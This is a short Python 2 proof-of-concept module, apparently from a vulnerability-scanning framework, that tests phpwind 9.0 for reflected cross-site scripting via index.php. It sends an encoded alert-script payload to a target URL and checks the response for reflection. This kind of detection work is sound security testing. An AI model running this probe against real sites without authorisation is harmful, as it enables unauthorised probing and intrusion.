#!/usr/bin/env python
# coding=utf-8


import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        
        'poc': {
            'id': 'poc-2014-0200',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'phpwind',
            'vul_version': ['9.0'],
            'type': 'Cross Site Scripting',
            'tag': ['phpwind漏洞', 'xss漏洞', '/index.php', 'php'],
            'desc': '漏洞文件：index.php',
            'references': ['http://wooyun.org/bugs/wooyun-2012-012163',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = '/index.php?m=1%22%3E%3Cscript%3Ealert%28%22bb2%22%29%3C%2Fscript%3E%26c%3Dforum'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        try:
            content = urllib2.urlopen(req).read()
        except urllib2.URLError, e:
            content = e.read()
            if '<script>alert("bb2")</script>' in content:
                args['success'] = True
                args['poc_ret']['vul_url'] = verify_url
            return args
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
  
